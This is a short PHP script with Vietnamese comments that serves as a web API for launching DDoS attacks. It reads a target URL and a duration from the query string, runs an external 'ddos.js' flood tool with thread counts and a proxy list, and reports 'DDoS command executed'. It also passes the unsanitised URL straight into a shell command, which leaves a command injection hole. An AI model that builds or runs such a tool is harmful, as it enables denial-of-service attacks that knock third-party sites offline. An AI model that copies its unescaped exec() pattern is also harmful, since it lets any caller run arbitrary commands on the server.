<?php
// Cấu hình file log (nếu cần)
$logFile = 'api_log.txt';
function writeLog($message, $file) {
    file_put_contents($file, date('[Y-m-d H:i:s] ') . $message . PHP_EOL, FILE_APPEND);
}

// Nhận tham số từ URL
$url = isset($_GET['url']) ? $_GET['url'] : '';
$time = isset($_GET['time']) ? (int)$_GET['time'] : 0;

if (empty($url) || $time <= 0) {
    $response = [
        'status' => 'error',
        'message' => 'Missing or invalid parameters (url and time are required)'
    ];
    echo json_encode($response);
    exit;
}

// Chuẩn bị lệnh (giả sử ddos.js nhận tham số: method, url, time, threads, proxies)
$command = "node ddos.js GET $url $time 32 64 http.txt 2>&1"; // Chuyển stdout và stderr vào output
$output = [];
$returnVar = -1;

writeLog("Request received: URL=$url, Time=$time", $logFile);

// Chạy lệnh và chờ kết quả
exec($command, $output, $returnVar);

writeLog("Command executed: $command", $logFile);
writeLog("Command output: " . implode("\n", $output), $logFile);
writeLog("Return code: $returnVar", $logFile);

// Chuẩn bị phản hồi JSON
$response = [
    'status' => ($returnVar === 0) ? 'success' : 'error',
    'url' => $url,
    'time' => $time,
    'output' => $output,
    'return_code' => $returnVar,
    'message' => ($returnVar === 0) ? 'DDoS command executed' : 'DDoS command failed'
];

echo json_encode($response);
?>
